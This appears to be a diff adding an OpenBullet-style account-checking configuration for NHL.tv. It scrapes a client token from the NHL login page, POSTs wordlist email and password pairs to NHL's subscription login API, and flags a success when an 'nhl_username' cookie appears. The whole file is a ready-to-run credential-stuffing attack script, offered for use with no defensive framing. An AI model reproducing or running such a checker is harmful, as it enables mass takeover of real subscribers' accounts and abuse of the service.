@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "NHL.tv",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-16T09:25:57.4165446+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://www.nhl.com/login?forwardUrl=https://www.nhl.com/tv" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+#TOKEN PARSE "<SOURCE>" LR "control_plane_client_token\" content=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST REQUEST POST "https://gateway.web.nhl.com/ws/subscription/flow/nhlPurchase.login" AutoRedirect=TRUE 
+  CONTENT "{\"nhlCredentials\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Authorization: Basic <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "nhl_username" 
+  KEYCHAIN Failure OR 
+    KEY "<COOKIES{*}>" DoesNotContain "nhl_username" 
